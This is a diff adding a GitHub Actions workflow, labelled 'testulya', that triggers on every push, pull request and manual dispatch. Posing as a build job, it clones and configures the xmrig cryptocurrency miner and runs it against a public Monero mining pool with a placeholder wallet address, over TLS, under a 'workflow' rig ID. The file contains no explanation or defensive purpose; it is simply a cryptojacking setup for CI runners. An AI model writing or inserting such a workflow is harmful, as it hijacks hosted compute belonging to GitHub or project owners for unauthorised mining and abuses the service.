@@ -1,0 +1,29 @@
+name: testulya
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Installs xmrig
+        run: |
+          sudo apt update
+          sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+
+      - name: Runs xmrig
+        run: |
+          ./xmrig -o pool.minexmr.com:443 -u {yourXMRAddress} -k --tls --rig-id workflow
+
